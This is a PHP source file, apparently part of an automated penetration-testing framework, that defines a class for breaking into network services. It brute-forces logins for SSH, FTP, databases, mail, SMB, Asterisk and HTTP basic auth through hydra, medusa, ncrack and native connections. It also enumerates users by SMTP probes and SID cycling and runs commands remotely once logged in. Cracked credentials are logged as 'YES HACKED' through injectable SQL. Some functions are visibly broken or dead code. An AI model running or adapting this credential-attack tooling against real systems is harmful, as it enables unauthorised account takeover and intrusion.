<?php




class AUTH extends PORT{

    var $path_rpcclient ;
    var $path_hydra ;
    var $path_medusa ;
    var $path_ncrack ;
    var $path_smbclient ;
    
	// mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute="select service2vuln from PORT where service2vuln like '%valid%';"  2>/dev/null | grep -i -E "(Valid credentials|password)"o
    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
		// /usr/share/nmap/scripts/
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);

	}
	

	
	public function port2auth4dico4hydra($service,$username){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__.": $service://'$username':Dico");
	    $service = trim($service);
	    $username = trim($username);
	    $query_hydra = "hydra -l \"$username\" -P \"$this->dico_password.1000\" $this->ip $service -f -t 12 -e sr -s $this->port -w 5s -c 5 -I 2>/dev/null  | grep -i 'login:'   ";
	    $result .= $this->cmd("localhost",$query_hydra);
	    return  $result.$this->auth2login4hydra($this->req_ret_str($query_hydra));
	}
	
	public function port2auth4dico4medusa($service,$username){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__.": $service://'$username':Dico");
	    $service = trim($service);
	    $username = trim($username);
	    $query_medusa = "medusa -u \"$username\" -P \"$this->dico_password.1000\" -h '$this->ip' -M $service -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
	    $result .= $this->cmd("localhost",$query_medusa);
	    return  $result.$this->auth2login4medusa($this->req_ret_str($query_medusa));
	}
	
	public function port2auth4dico4ncrack($username){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__.": $this->port//'$username':Dico");
	    $username = trim($username);
	    $query_ncrack = "ncrack -u \"$username\" -P \"$this->dico_password.1000\" $this->ip:$this->port  2>/dev/null | grep \"$this->port:\"   ";
	    $result .= $this->cmd("localhost",$query_ncrack);
	    return  $result.$this->auth2login4ncrack($this->req_ret_str($query_ncrack));
	}
	
	
	public function port2auth4pass4hydra($service,$username,$userpass){
	    $this->ssTitre(__FUNCTION__.": $service://'$username':'$userpass'");
	    $service = trim($service);
	    $username = trim($username);
	    $query_hydra = "hydra -l \"$username\" -p \"$userpass\" $this->ip $service -f -t 3 -e sr -s $this->port -w 5s 2>/dev/null  | grep -i 'login:'  ";
	    return  $this->auth2login4hydra($this->req_ret_str($query_hydra));
	    
	}
	
	public function port2auth4pass4medusa($service,$username,$userpass){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__.": $service://'$username':'$userpass'");
	    $service = trim($service);
	    $username = trim($username);
	    $query_medusa = "medusa -u \"$username\" -p \"$userpass\" -h '$this->ip' -M $service -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
	    $result .= $this->cmd("localhost",$query_medusa);
	    return  $result.$this->auth2login4medusa($this->req_ret_str($query_medusa));
	    
	}
	public function port2auth4pass4ncrack($username,$userpass){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__.": $this->port://'$username':'$userpass'");
	    $username = trim($username);
	    $query_ncrack = "ncrack -u \"$username\" -p \"$userpass\" $this->ip:$this->port  2>/dev/null | grep \"$this->port:\"  ";
	    $result .= $this->cmd("localhost",$query_ncrack);
	    return  $result.$this->auth2login4ncrack($this->req_ret_str($query_ncrack));
	}
	
	public function auth2login4ncrack($results){
	    $result = "";
	    return $result;
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',$fonction,$this->ip2geoip());
	                }
	            }
	        }
	    }
	    return $results.$result;
	}
	
	public function auth2login4nmap($results_xml,$fonction){
	    $user2info = $fonction ;
	    $user2name = "";
	    $user2pass = "";
	    $xml=simplexml_load_string($results_xml);
	    /*
	     var_dump($xml);
	     var_dump($xml->host->ports->port->script->table) ;
	     echo $xml->host->ports->port->script->table->table->elem[0]['key'];
	     echo $xml->host->ports->port->script->table->table->elem[1]['key'];
	     echo $xml->host->ports->port->script->table->table->elem[2]['key'];
	     $this->pause();
	     */
	    if (isset($xml->host->ports->port->script->table->table)){
	        foreach ($xml->host->ports->port->script->table->children() as $elem){
	            if (isset($elem->elem[2])) { if($elem->elem[2]['key']='username') $user2name = $elem->elem[2];}
	            if (isset($elem->elem[0])) { if($elem->elem[0]['key']='password') $user2pass = $elem->elem[0];}
	            if (!empty($user2name)){
	                $this->article("USERNAME", $user2name);
	                $this->article("USERPASS", $user2pass);
	                $this->article("USERINFO", $user2info);
	                $this->yesAUTH($this->port2id, $user2name, $user2pass, NULL, NULL,NULL, NULL,NULL,$user2info);
	            }
	        }
	    }
	    
	    
	    /*
	     $user2name = "";
	     $user2pass = "";
	     if (isset($xml->host->ports->port->script)){
	     foreach ($xml->host->ports->port->script->children() as $elem){
	     if (isset($elem->table->elem[0]))  $user2name = $elem->table->elem[0];
	     if (isset($elem->table->elem[2]))  $user2pass = $elem->table->elem[2];
	     if (!empty($user2name)){
	     $this->article("USERNAME", $user2name);
	     $this->article("USERPASS", $user2pass);
	     $this->article("USERINFO", $user2info);
	     $this->pause();
	     //$this->yesAUTH($this->port2id, $user2name, $user2pass, NULL, NULL, NULL, NULL, NULL, $user2info, $this->ip2geoip());
	     }
	     }
	     }
	     
	     */
	    
	}
	
	public function auth2login4nmap8tmp($results,$fonction){
	    $result = "";
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',$fonction,$this->ip2geoip());
	                }
	            }
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+)([[:space:]]{1,})([[:print:]]{1,})([[:space:]]{1,})Login correct/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',$fonction,$this->ip2geoip());
	                }
	            }
	            
	            if (preg_match("/(?<login>[[:print:]]\w+):(?<pass>[[:print:]]\w+) => Valid credentials/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',$fonction,$this->ip2geoip());
	                }
	            }
	            
	            
	        }
	    }
	    return $results.$result;
	}
	
	
	
	
	
	public function yesAUTH($id8port,$user2name,$user2passe,$user2uid,$user2gid,$user2def,$user2home,$user2shell,$user2info) {
	    //$id8port = trim($id8port);$user2name = trim($user2name);$user2passe = trim($user2passe);$user2uid = trim($user2uid);$user2gid = trim($user2gid);$user2def = trim($user2def);$user2home = trim($user2home);$user2shell = trim($user2shell);$user2info = trim($user2info);
	    $chaine = "YES HACKED = $id8port:$user2name:$user2passe:$user2uid:$user2gid:$user2def:$user2home:$user2shell:$user2info";
	    $sql_r = "SELECT user2name,user2pass FROM AUTH WHERE id8port = $id8port AND user2name= '$user2name' AND user2pass= '$user2passe' ";
	    //echo "$sql_r\n";
	    if (!$this->checkBD($sql_r)) {
	        $sql_w = "INSERT INTO AUTH (id8port,user2name,user2pass,user2uid,user2gid,user2def,user2home,user2shell,user2info) VALUES ($id8port,'$user2name','$user2passe','$user2uid','$user2gid','$user2def','$user2home','$user2shell','$user2info');";
	        $this->mysql_ressource->query($sql_w);
	        echo "$sql_w\n";$this->pause();
	    }
	    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","") ;
	}
	
	
	public function auth2login4hydra($results){
	    $afficheUSER = array();
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            
	            if (preg_match("/login: (?<login>[[:print:]]\w+)([[:space:]]{1,})password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                //var_dump($afficheUSER);
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',__FUNCTION__);

	                }
	            }
	            
	            // VNC
	            if (preg_match("/password: (?<pass>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                //var_dump($afficheUSER);
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,"", $afficheUSER['pass'], '','','','','',__FUNCTION__);

	                }
	            }
	            
	            if (preg_match("/login: (?<login>[[:print:]]\w+)$/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $this->yesAUTH($this->port2id,$afficheUSER['login'], "", '','','','','',__FUNCTION__);
	                }
	            }
	            
	        }
	    }
	    
        
	}
	

	
	public function auth2login4medusa($results){
	    $result = "$results";
	    if (!empty($results)){
	        $results_dico  = explode("\n", $results);
	        foreach ($results_dico as $user){
	            if (preg_match("/User: (?<login>[[:print:]]\w+)([[:space:]]{1,})Password: (?<pass>[[:print:]]\w+)([[:space:]]{1,})/", $user, $afficheUSER) ) {
	                if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                    $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], $afficheUSER['pass'], '','','','','',__FUNCTION__,$this->ip2geoip());
	                }
	            }
	            /*
	             if (preg_match("/login: (?<login>[[:print:]]\w+)([[:space:]]{1,})$/", $result, $afficheUSER) ) {
	             if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	             $result .= $this->yesAUTH($this->port2id,$afficheUSER['login'], "", '','','','','',__FUNCTION__,$this->ip2geoip());
	             }
	             }
	             */
	            
	        }
	    }
	    return $result;
	}
	
	
	

	function auth2login_ssh($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ssh '$user2name':'$user2pass'@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -v");
	    if (!$connexion = @ssh2_connect($this->ip,$port)) return false ;
		return (@ssh2_auth_password($connexion, $user2name, $user2pass))?true:false;
	}
	
	function auth2login_ssh4dico($user2name) {
		$this->ssTitre(__FUNCTION__);
		$user2pass = $user2name;
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass, '','','','','',__FUNCTION__,$this->ip2geoip());
		$user2pass = "";
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass, '','','','','',__FUNCTION__,$this->ip2geoip());
		$user2pass = strrev($user2name);
		if ($this->auth2login_ssh($user2name, $user2pass)) $this->yesAUTH($this->port2id, $user2name, $user2pass, '','','','','',__FUNCTION__,$this->ip2geoip());
		$passwords = file("$this->dico_password.100");
		foreach ($passwords as $password){
		    $password = trim($password);
		    if ($this->auth2login_ssh($user2name, $password)) $this->yesAUTH($this->port2id, $user2name, $password, '','','','','',__FUNCTION__,$this->ip2geoip());
		}
	}
	
	
	
	function auth2login_ftp($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ftp '$user2name':'$user2pass'@$this->ip -p $port ");
		$connexion = @ftp_connect($this->ip,$port) ;
		return (@ftp_login($connexion, $user2name, $user2pass))?true:false ;
	}
	
	
	function auth2login_ftp4exec($user2name,$user2pass,$command) {
	    $result = "";
	    $command = trim($command);
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $result .= $this->ssTitre(__FUNCTION__.": ftp '$user2name':'$user2pass'@$this->ip -p $this->port '$command' ");
	    $connexion = @ftp_connect($this->ip,$this->port) ;
	    if(@ftp_login($connexion, $user2name, $user2pass)){
	    //$result .= ftp_pwd($connexion);
	    // get the file list for /

	    $result_cmd = $this->chaine(ftp_raw($connexion, $command));

	    $result .= "$result_cmd\n";
	    ftp_close($connexion);
	    }
	    
	    return $result;
	}
	
	
	
	function auth2login_mysql($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": mysql --user='$user2name' --password='$user2pass' --host=$this->ip --port=$port ");
	    return (@mysqli_connect($this->ip,$user2name,$user2pass,"information_schema",$port))?true:false;
	}
	
	function auth2login_pgsql($port,$user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": psql -h $this->ip -p $port -U '$user2name' -W '$user2pass' test");
		$conn_string = "host=$this->ip port=$port user='$user2name' password='$user2pass'";
		return (@pg_connect($conn_string))?true:false;
	}
	

	
	function auth2login_db2($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": db2 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$conn_string = "HOSTNAME=$this->ip;PORT=$this->port;PROTOCOL=TCPIP;UID=$user2name;PWD=$user2pass";
		return (@db2_connect($conn_string))?true:false;
	}
	
	function auth2login_nntp($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": nntp '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port/nntp}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_imap($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": imap '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_pop3($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": pop3 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":$this->port/pop3}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":$this->port}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	
	
	
	

	function auth2login_imapssl($user2name,$user2pass) {
		$user2pass = trim($user2pass);
		$user2name = trim($user2name);
		$this->ssTitre(__FUNCTION__.": imapssl '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":993/imap/ssl}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":143}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	function auth2login_pop3ssl($user2name,$user2pass) {
		$user2pass = trim($user2pass);
		$user2name = trim($user2name);
		$this->ssTitre(__FUNCTION__.": pop3ssl '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$mbox = imap_open("{".$this->ip.":995/pop3/ssl/novalidate-cert}INBOX",$user2name,$user2pass);
		if ($mbox == false) {echo "connexion failed\n";return FALSE;}
		$folders = imap_listmailbox($mbox, "{".$this->ip.":143}", "*");
		if ($folders == false) {echo "ListMail failed\n";return FALSE;}
		else 	{$this->tab($folders);return TRUE;}
	}
	
	

	
	function auth2login_ldap($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": ldap '$user2name':'$user2pass'@$this->ip -p $this->port ");
		return (@ldap_connect($this->ip,$this->port))?true:false;
		// http://www.linux-france.org/prj/edu/archinet/systeme/ch56s05.html
	}
	
	
	function auth2login_mongodb($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": mongodb '$user2name':'$user2pass'@$this->ip -p $this->port ");
	    //$m = new MongoClient("mongodb://${$user2name}:${$user2pass}@$this->ip");
	    //return ($m)?true:false;
	}
	
	
	

	
	
	
	public function auth2login_smtp($port,$method,$username) {  // 25
	    $this->ssTitre(__FUNCTION__);
		$username = trim($username);
		if (empty($username)) return false;
		$fp = @fsockopen ($this->ip, $port, $errno, $errstr, 30 );
		if (! $fp) {
			echo " Erreur : $errstr ($errno) ".__FUNCTION__."\n";
		} else {
			$en_tete = fgets ( $fp );
			$code = substr ( $en_tete, 0, 3 );
			$code = ( int ) $code;
			// echo "Connexion : $code ->";
			if ($code == 220) {
				$out = "$method $username\n";
				fwrite ( $fp, $out );
			}
			$en_tete = fgets ( $fp );
			$code = substr ( $en_tete, 0, 3 );
			$code = ( int ) $code;
			// echo "APRES vrfy $mail : $code \n";
			fclose ( $fp );
			if ($code == 251 || $code == 551 ) return true;
			else return false;
		}
	}






	public function auth2login_finger($user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": finger '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$this->note("finger $user2name@$this->ip ");
	}
	

	
	public function auth2login_http4basic($user2name,$user2pass,$uri_401){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": 401 '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$check = "";
		$query = "hydra -s $this->port -l $user2name -p $user2pass -w 30 -t 1 -f $this->ip http-get $uri_401 -e nsr | grep -i  'login:' | grep 'password:' ";
		$check = $this->req_ret_str($query);
		if (empty($check)) return FALSE;
		else return TRUE;
	
	}
	public function auth2login_asterisk($user2name,$user2pass) {// 5038
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": asterisk '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n' | nc $this->ip $this->port -v -w3 -n  | grep 'Authentication accepted' ";//
		$result = $this->req_ret_str($query);
		if (!empty($result)) return TRUE;
		else return FALSE;
	}
	
	public	function auth2login_ssh4pubkeyfile($cmd,$user2name,$private_key_ssh_rsa_file,$pass_phrase,$port) {
		$this->ssTitre(__FUNCTION__);
		$cmd = addslashes($cmd);
		$result .= $this->ssTitre(__FUNCTION__);
		$query = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null $user2name@$this->ip -p $port \"$cmd\" ";
		$result .= $this->cmd("localhost",$query);
		$result .= $this->req_ret_str($query);	
		return 	$result;	/*
		 //$result .= $test_auth->yesAUTH($this->ip, $this->ip, 22, 'T',$user2name, $user2pass, $this->ip2geoip());
		 if (! ($con = ssh2_connect ( $this->ip, $this->port, array('hostkey'=>'ssh-rsa') ))) { $this->rouge("Failed Connexion"); return "Failed Connexion";}
		 if (! ssh2_auth_pubkey_file($con, $user2name,"/tmp/$this->ip"."_rsa.pub","/tmp/$this->ip"."_rsa",$user2pass)) { $this->rouge("Failed Authentication Pub File Key"); return "Failed Authentication Pub File Key";}
		 if (! ($stream = ssh2_exec ( $con, $cmd ))) { $this->rouge("Failed Command Execution"); return "Failed Command Execution";}
	
		 stream_set_blocking($stream, true);
		 $i=0;
	
		 $this->cmd($this->ip, $cmd);
		 $result = stream_get_line($stream, 1024, "\n");
		 while (!feof($stream))
		 {
		 $result = $result."\n";
		 $result .= stream_get_line($stream, 1024, "\n");
		 $i++;
		 }
		 echo $result;
		 unset($stream);
		 return $result;
		 */
	}

	
	
	public function auth2login_smb($user2name,$user2pass) {
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": smb '$user2name':'$user2pass'@$this->ip -p $this->port ");
		$this->cmd("Win","net use \\\\$this->ip\\C $user2pass /u:$user2name");
		$query = "smbclient -L $this->ip -U $user2name%$user2pass  2>/dev/null | grep 'NT_STATUS_LOGON_FAILURE' ";
		$check = $this->req_ret_str($query);
		if (!empty($check)) return FALSE;
		else return TRUE;
	}
	
	public function auth2login_sid($sid,$user2name,$user2pass){
	    $user2pass = trim($user2pass);
	    $user2name = trim($user2name);
	    $this->ssTitre(__FUNCTION__.": sid '$user2name':'$user2pass'@$this->ip -p $this->port ");
	    $result = "";
	    $this->article("SID", $sid);
	    $check = $this->req_ret_str("rpcclient -c 'lookupsids $sid-500' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep \"NT_STATUS_ACCESS_DENIED\" ");
	    $check = trim($check);
	    if (empty($check)){
	    for ($rid = 1;$rid<=3050;$rid++) $result .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v \"NT_STATUS_ACCESS_DENIED\" | grep -v \"*unknown*\" |  sed \"s/(1)/(Local User)/g\" | sed \"s/(2)/(Domain Group)/g\" | sed \"s/(3)/(Domain User)/g\" | sed \"s/(4)/(Local Group)/g\" | grep '(Local User)' | cut -d'\' -f2 | cut -d'(' -f1 ")."\n";
	    }
	         return $result;                  
	}
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
}
?>